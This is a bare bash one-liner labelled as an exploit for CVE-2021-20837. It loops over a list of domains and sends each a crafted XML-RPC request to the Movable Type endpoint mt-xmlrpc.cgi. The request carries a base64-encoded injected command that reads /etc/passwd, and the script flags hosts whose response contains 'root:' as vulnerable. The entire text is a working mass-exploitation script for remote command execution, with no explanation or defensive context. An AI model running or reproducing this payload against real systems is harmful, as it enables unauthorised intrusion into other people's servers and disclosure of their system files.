
###CVE 2021-20837

```
while read LINE; do curl -s -k -H "Content-Type: text/xml" -X POST --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>mt.handler_to_coderef</methodName><params><param><value><base64>YGNhdCAvZXRjL3Bhc3N3ZGA=</base64></value></param></params></methodCall>" "$LINE/cgi-bin/mt/mt-xmlrpc.cgi" 2>&1 | grep -q -e "root:*" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domains-list.txt ```
